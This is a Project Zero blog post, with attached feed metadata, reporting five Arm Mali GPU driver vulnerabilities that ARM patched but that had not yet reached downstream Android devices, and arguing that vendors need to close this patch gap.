<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=OPeqXG-QxW3ZD8BtmPikfA');.lst-kix_9apzkelodq30-0>li:before{content:"\0025cf  "}ul.lst-kix_9apzkelodq30-6{list-style-type:none}ul.lst-kix_9apzkelodq30-7{list-style-type:none}ul.lst-kix_9apzkelodq30-4{list-style-type:none}ul.lst-kix_9apzkelodq30-5{list-style-type:none}ul.lst-kix_9apzkelodq30-2{list-style-type:none}ul.lst-kix_9apzkelodq30-3{list-style-type:none}ul.lst-kix_9apzkelodq30-0{list-style-type:none}.lst-kix_9apzkelodq30-6>li:before{content:"\0025cf  "}ul.lst-kix_9apzkelodq30-1{list-style-type:none}.lst-kix_9apzkelodq30-5>li:before{content:"\0025a0  "}.lst-kix_9apzkelodq30-3>li:before{content:"\0025cf  "}.lst-kix_9apzkelodq30-7>li:before{content:"\0025cb  "}.lst-kix_9apzkelodq30-4>li:before{content:"\0025cb  "}.lst-kix_9apzkelodq30-8>li:before{content:"\0025a0  "}ul.lst-kix_9apzkelodq30-8{list-style-type:none}.lst-kix_9apzkelodq30-1>li:before{content:"\0025cb  "}.lst-kix_9apzkelodq30-2>li:before{content:"\0025a0  "}ol{margin:0;padding:0}table td,table th{padding:0}.HwIiAvYVxJ-c0{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.HwIiAvYVxJ-c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:16pt;font-family:"Arial";font-style:normal}.HwIiAvYVxJ-c7{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.HwIiAvYVxJ-c9{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial"}.HwIiAvYVxJ-c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.HwIiAvYVxJ-c3{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.HwIiAvYVxJ-c10{background-color:#ffffff;font-size:10.5pt;font-family:"Roboto";font-weight:400}.HwIiAvYVxJ-c8{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.HwIiAvYVxJ-c1{color:inherit;text-decoration:inherit}.HwIiAvYVxJ-c11{background-color:#ffffff}.HwIiAvYVxJ-c2{font-style:italic}.HwIiAvYVxJ-c5{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style><body class="c8 doc-content">
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c0">By Ian Beer, Project Zero </span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c2">Note: The vulnerabilities discussed in this blog post (CVE-2022-33917) are fixed by the upstream vendor, but at the time of publication, t</span><span class="HwIiAvYVxJ-c2 HwIiAvYVxJ-c11">hese fixes have not yet made it downstream to affected Android devices (including Pixel, Samsung, Xiaomi, Oppo and others). Devices with a Mali GPU are currently vulnerable.</span><span class="HwIiAvYVxJ-c9 HwIiAvYVxJ-c2">&nbsp;</span></p><h2 class="HwIiAvYVxJ-c7" id="h.mvgq8h546lfi"><span class="HwIiAvYVxJ-c6">Introduction</span></h2>
 <p class="HwIiAvYVxJ-c4"><span>In June 2022, Project Zero researcher Maddie Stone gave a talk at </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://www.first.org/conference/2022/">FirstCon22</a></span><span>&nbsp;titled </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html">0-day In-the-Wild Exploitation in 2022so far</a></span><span>. A key takeaway was that approximately 50% of the observed 0-days in the first half of 2022 were variants of previously patched vulnerabilities. This finding is consistent with our understanding of attacker behavior: </span><span class="HwIiAvYVxJ-c10">attackers will take the path of least resistance, and as long as vendors don't consistently perform thorough root-cause analysis when fixing security vulnerabilities, it will continue to be worth investing time in trying to revive known vulnerabilities before looking for novel ones</span><span class="HwIiAvYVxJ-c0">.</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c0">The presentation discussed an in the wild exploit targeting the Pixel 6 and leveraging CVE-2021-39793, a vulnerability in the ARM Mali GPU driver used by a large number of other Android devices. ARM's advisory described the vulnerability as: </span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c2">Title</span><span class="HwIiAvYVxJ-c0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mali GPU Kernel Driver may elevate CPU RO pages to writable</span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c2">CVE</span><span class="HwIiAvYVxJ-c0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2022-22706 (also reported in CVE-2021-39793)</span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c2">Date of issue</span><span class="HwIiAvYVxJ-c0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6th January 2022 </span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c2">Impact</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;A non-privileged user can get a write access to read-only memory pages [</span><span class="HwIiAvYVxJ-c2">sic</span><span class="HwIiAvYVxJ-c0">].</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span>The week before FirstCon22, Maddie gave an internal preview of her talk. Inspired by the description of an in-the-wild vulnerability in low-level memory management code, fellow Project Zero researcher Jann Horn started auditing the ARM Mali GPU driver. Over the next three weeks, Jann found five more exploitable vulnerabilities (</span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2325">2325</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2327">2327</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2331">2331</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2333">2333</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2334">2334</a></span><span class="HwIiAvYVxJ-c0">).</span></p><h2 class="HwIiAvYVxJ-c7" id="h.9l9fwyug2cxl"><span class="HwIiAvYVxJ-c6">Taking a closer look</span></h2>
 <p class="HwIiAvYVxJ-c4"><span>One of these issues (</span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2334">2334</a></span><span>) lead to kernel memory corruption, one (</span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2331">2331</a></span><span>) lead to physical memory addresses being disclosed to userspace and the remaining three (</span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2325">2325</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2327">2327</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2333">2333</a></span><span class="HwIiAvYVxJ-c0">) lead to a physical page use-after-free condition. These would enable an attacker to continue to read and write physical pages after they had been returned to the system.</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span>For example, by forcing the kernel to </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://googleprojectzero.blogspot.com/2021/10/how-simple-linux-kernel-memory.html">reuse these pages as page tables</a></span><span class="HwIiAvYVxJ-c0">, an attacker with native code execution in an app context could gain full access to the system, bypassing Android's permissions model and allowing broad access to user data.</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span>Anecdotally, we heard from multiple sources that the Mali issues we had reported collided with vulnerabilities available in the 0-day market, and we even saw one </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://twitter.com/jgrusko/status/1571921203723440135">public reference</a></span><span class="HwIiAvYVxJ-c0">:</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c0"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s1420/tweet.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="@ProjectZeroBugs\nArm Mali: driver exposes physical addresses to unprivileged userspace\n\n
 @jgrusko Replying to @ProjectZeroBugs\nRIP the feature that was there forever and nobody wanted to report :)" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s1200/tweet.png" title="@ProjectZeroBugs\nArm Mali: driver exposes physical addresses to unprivileged userspace\n\n
 @jgrusko Replying to @ProjectZeroBugs\nRIP the feature that was there forever and nobody wanted to report :)" width="640/" /></a></span></p><h2 class="HwIiAvYVxJ-c7" id="h.r9ws488aqcv6"><span class="HwIiAvYVxJ-c6">The "Patch gap" is for vendors, too</span></h2>
 <p class="HwIiAvYVxJ-c4"><span>We reported these five issues to ARM when they were discovered between June and July 2022. ARM fixed the issues promptly in July and August 2022, disclosing them as security issues on their </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://developer.arm.com/Arm%20Security%20Center/Mali%20GPU%20Driver%20Vulnerabilities">Arm Mali Driver Vulnerabilities</a></span><span>&nbsp;page (assigning </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://nvd.nist.gov/vuln/detail/CVE-2022-36449">CVE-2022-36449</a></span><span>) and publishing the </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://developer.arm.com/downloads/-/mali-drivers/valhall-kernel">patched driver source on their public developer website</a></span><span class="HwIiAvYVxJ-c0">.</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span>In line with our </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html">2021 disclosure policy update</a></span><span>&nbsp;we then waited an additional 30 days before derestricting our Project Zero tracker entries. Between late August and mid-September 2022 we derestricted these issues in the public Project Zero tracker: </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2325">2325</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2327">2327</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2331">2331</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2333">2333</a></span><span>, </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2334">2334</a></span><span class="HwIiAvYVxJ-c0">.</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span>When time permits and as an additional check, we test the effectiveness of the patches that the vendor has provided. This sometimes leads to follow-up bug reports where a patch is incomplete or a variant is discovered (for a recently compiled list of examples, see </span><span class="HwIiAvYVxJ-c3"><a class="HwIiAvYVxJ-c11" href="https://googleprojectzero.blogspot.com/2022/06/2022-0-day-in-wild-exploitationso-far.html">the first table in this blogpost</a></span><span class="HwIiAvYVxJ-c0">), and sometimes we discover the fix isn't there at all. </span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c0">In this case we discovered that all of our test devices which used Mali are still vulnerable to these issues. CVE-2022-36449 is not mentioned in any downstream security bulletins.</span></p><h2 class="HwIiAvYVxJ-c7" id="h.yanf95yf2fn7"><span class="HwIiAvYVxJ-c6">Conclusion</span></h2>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c0">Just as users are recommended to patch as quickly as they can once a release containing security updates is available, so the same applies to vendors and companies. Minimizing the "patch gap" as a vendor in these scenarios is arguably more important, as end users (or other vendors downstream) are blocking on this action before they can receive the security benefits of the patch.</span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p>
 <p class="HwIiAvYVxJ-c4"><span class="HwIiAvYVxJ-c0">Companies need to remain vigilant, follow upstream sources closely, and do their best to provide complete patches to users as soon as possible. </span></p>
 <p class="HwIiAvYVxJ-c4 HwIiAvYVxJ-c5"><span class="HwIiAvYVxJ-c0"></span></p></body>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/7519748497805371118/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/7519748497805371118
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/7519748497805371118
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/11/mind-the-gap.html
## @title
Mind the Gap
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHlABpgRGtGMlLmoEY3wDYvg13cwbxPVGScpjHBa0wa8vaohGjhB9YkYuIyfxxnm2iWh4czqp1YUdMCrSgy-dtdlZ8FkLV5IDrQZ1SSCNUoYjsJlHdPoOjtUar_uHQda_aAUu75_4sUUAFjM7Jvr-d6JOMHD7AexIZMXDsdrZIdKX7aA4wrhRC6PCD/s72-c/tweet.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-5910791167813767823
## published
04/11/2022 12:50:00
## updated
10/01/2023 14:48:35
## title
## @type
text
## #text
A Very Powerful Clipboard: Analysis of a Samsung in-the-wild exploit chain
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=lhDjYqiy3mZ0x6ROQEUoUw');ol.lst-kix_gtv3l2c5wia7-3.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-3 0}ol.lst-kix_lsx8wn19rrkf-0.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-0 0}.lst-kix_hbruetvjkelf-8>li:before{content:"\0025a0  "}.lst-kix_hbruetvjkelf-7>li:before{content:"\0025cb  "}.lst-kix_gtv3l2c5wia7-3>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-3}.lst-kix_olk2lnn0afau-5>li{counter-increment:lst-ctn-kix_olk2lnn0afau-5}ol.lst-kix_gtv3l2c5wia7-6.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-6 0}.lst-kix_lsx8wn19rrkf-4>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-4}.lst-kix_gtv3l2c5wia7-5>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-5,lower-roman) ". "}.lst-kix_gtv3l2c5wia7-2>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-2}.lst-kix_gtv3l2c5wia7-4>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-4,lower-latin) ". "}.lst-kix_hbruetvjkelf-0>li:before{content:"\0025cf  "}.lst-kix_gtv3l2c5wia7-6>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-6,decimal) ". "}.lst-kix_hbruetvjkelf-1>li:before{content:"\0025cb  "}.lst-kix_gtv3l2c5wia7-7>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-7,lower-latin) ". "}ol.lst-kix_lsx8wn19rrkf-3.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-3 0}.lst-kix_lsx8wn19rrkf-5>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-5}.lst-kix_gtv3l2c5wia7-8>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-8,lower-roman) ". "}.lst-kix_lsx8wn19rrkf-2>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-2}.lst-kix_hbruetvjkelf-4>li:before{content:"\0025cb  "}.lst-kix_hbruetvjkelf-3>li:before{content:"\0025cf  "}.lst-kix_hbruetvjkelf-5>li:before{content:"\0025a0  "}.lst-kix_hbruetvjkelf-2>li:before{content:"\0025a0  "}.lst-kix_hbruetvjkelf-6>li:before{content:"\0025cf  "}ol.lst-kix_olk2lnn0afau-0.start{counter-reset:lst-ctn-kix_olk2lnn0afau-0 0}ol.lst-kix_olk2lnn0afau-6.start{counter-reset:lst-ctn-kix_olk2lnn0afau-6 0}.lst-kix_olk2lnn0afau-7>li{counter-increment:lst-ctn-kix_olk2lnn0afau-7}ol.lst-kix_lsx8wn19rrkf-6.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-6 0}ol.lst-kix_olk2lnn0afau-3.start{counter-reset:lst-ctn-kix_olk2lnn0afau-3 0}.lst-kix_olk2lnn0afau-4>li{counter-increment:lst-ctn-kix_olk2lnn0afau-4}ol.lst-kix_gtv3l2c5wia7-5{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-6{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-7{list-style-type:none}.lst-kix_olk2lnn0afau-0>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-0,decimal) ". "}ol.lst-kix_gtv3l2c5wia7-8{list-style-type:none}.lst-kix_olk2lnn0afau-1>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-1,lower-latin) ". "}.lst-kix_gtv3l2c5wia7-0>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-0}.lst-kix_olk2lnn0afau-2>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-2,lower-roman) ". "}.lst-kix_olk2lnn0afau-4>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-4,lower-latin) ". "}ol.lst-kix_gtv3l2c5wia7-0{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-1{list-style-type:none}.lst-kix_gtv3l2c5wia7-6>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-6}.lst-kix_olk2lnn0afau-8>li{counter-increment:lst-ctn-kix_olk2lnn0afau-8}ol.lst-kix_gtv3l2c5wia7-2{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-3{list-style-type:none}.lst-kix_olk2lnn0afau-3>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-3,decimal) ". "}ol.lst-kix_gtv3l2c5wia7-4{list-style-type:none}.lst-kix_lsx8wn19rrkf-1>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-1}.lst-kix_lsx8wn19rrkf-7>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-7}ol.lst-kix_lsx8wn19rrkf-5.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-5 0}.lst-kix_olk2lnn0afau-2>li{counter-increment:lst-ctn-kix_olk2lnn0afau-2}ol.lst-kix_olk2lnn0afau-8{list-style-type:none}ol.lst-kix_olk2lnn0afau-7{list-style-type:none}.lst-kix_gtv3l2c5wia7-5>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-5}ol.lst-kix_olk2lnn0afau-6{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-4.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-4 0}.lst-kix_gtv3l2c5wia7-2>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-2,lower-roman) ". "}.lst-kix_gtv3l2c5wia7-1>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-1,lower-latin) ". "}.lst-kix_gtv3l2c5wia7-3>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-3,decimal) ". "}ol.lst-kix_olk2lnn0afau-5.start{counter-reset:lst-ctn-kix_olk2lnn0afau-5 0}.lst-kix_gtv3l2c5wia7-0>li:before{content:"" counter(lst-ctn-kix_gtv3l2c5wia7-0,decimal) ". "}.lst-kix_olk2lnn0afau-6>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-6,decimal) ". "}.lst-kix_olk2lnn0afau-8>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-8,lower-roman) ". "}ol.lst-kix_lsx8wn19rrkf-4.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-4 0}.lst-kix_olk2lnn0afau-5>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-5,lower-roman) ". "}ol.lst-kix_lsx8wn19rrkf-1{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-0{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-3{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-2{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-5{list-style-type:none}.lst-kix_olk2lnn0afau-7>li:before{content:"" counter(lst-ctn-kix_olk2lnn0afau-7,lower-latin) ". "}ol.lst-kix_lsx8wn19rrkf-4{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-7{list-style-type:none}ol.lst-kix_olk2lnn0afau-4.start{counter-reset:lst-ctn-kix_olk2lnn0afau-4 0}ol.lst-kix_lsx8wn19rrkf-6{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-7.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-7 0}.lst-kix_lsx8wn19rrkf-8>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-8,lower-roman) ". "}ol.lst-kix_lsx8wn19rrkf-8{list-style-type:none}.lst-kix_lsx8wn19rrkf-6>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-6,decimal) ". "}.lst-kix_x9fpm1r5kf6m-8>li:before{content:"\0025a0  "}.lst-kix_lsx8wn19rrkf-7>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-7,lower-latin) ". "}.lst-kix_lsx8wn19rrkf-0>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-0,decimal) ". "}.lst-kix_lsx8wn19rrkf-1>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-1,lower-latin) ". "}ol.lst-kix_olk2lnn0afau-7.start{counter-reset:lst-ctn-kix_olk2lnn0afau-7 0}.lst-kix_x9fpm1r5kf6m-6>li:before{content:"\0025cf  "}.lst-kix_lsx8wn19rrkf-2>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-2,lower-roman) ". "}.lst-kix_x9fpm1r5kf6m-7>li:before{content:"\0025cb  "}.lst-kix_x9fpm1r5kf6m-3>li:before{content:"\0025cf  "}.lst-kix_lsx8wn19rrkf-4>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-4,lower-latin) ". "}.lst-kix_lsx8wn19rrkf-5>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-5,lower-roman) ". "}.lst-kix_x9fpm1r5kf6m-4>li:before{content:"\0025cb  "}.lst-kix_lsx8wn19rrkf-3>li:before{content:"" counter(lst-ctn-kix_lsx8wn19rrkf-3,decimal) ". "}.lst-kix_x9fpm1r5kf6m-5>li:before{content:"\0025a0  "}ol.lst-kix_olk2lnn0afau-1{list-style-type:none}ol.lst-kix_olk2lnn0afau-0{list-style-type:none}.lst-kix_x9fpm1r5kf6m-0>li:before{content:"\0025cf  "}ol.lst-kix_olk2lnn0afau-5{list-style-type:none}ol.lst-kix_olk2lnn0afau-4{list-style-type:none}ol.lst-kix_olk2lnn0afau-3{list-style-type:none}ol.lst-kix_olk2lnn0afau-2{list-style-type:none}.lst-kix_lsx8wn19rrkf-8>li{counter-increment:lst-ctn-kix_lsx8wn19rrkf-8}.lst-kix_gtv3l2c5wia7-8>li{counter-increment:lst-ctn-kix_gtv3l2c5wia7-8}.lst-kix_x9fpm1r5kf6m-2>li:before{content:"\0025a0  "}ol.lst-kix_gtv3l2c5wia7-2.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-2 0}.lst-kix_x9fpm1r5kf6m-1>li:before{content:"\0025cb  "}ul.lst-kix_x9fpm1r5kf6m-3{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-4{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-1{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-2{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-0{list-style-type:none}ol.lst-kix_gtv3l2c5wia7-5.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-5 0}.lst-kix_olk2lnn0afau-1>li{counter-increment:lst-ctn-kix_olk2lnn0afau-1}ul.lst-kix_x9fpm1r5kf6m-7{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-8{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-5{list-style-type:none}ul.lst-kix_x9fpm1r5kf6m-6{list-style-type:none}ul.lst-kix_hbruetvjkelf-4{list-style-type:none}ul.lst-kix_hbruetvjkelf-3{list-style-type:none}ul.lst-kix_hbruetvjkelf-2{list-style-type:none}ul.lst-kix_hbruetvjkelf-1{list-style-type:none}ul.lst-kix_hbruetvjkelf-0{list-style-type:none}ol.lst-kix_lsx8wn19rrkf-2.start{counter-reset:lst-ctn-kix_lsx8wn19rrkf-2 0}ol.lst-kix_gtv3l2c5wia7-8.start{counter-reset:lst-ctn-kix_gtv3l2c5wia7-8 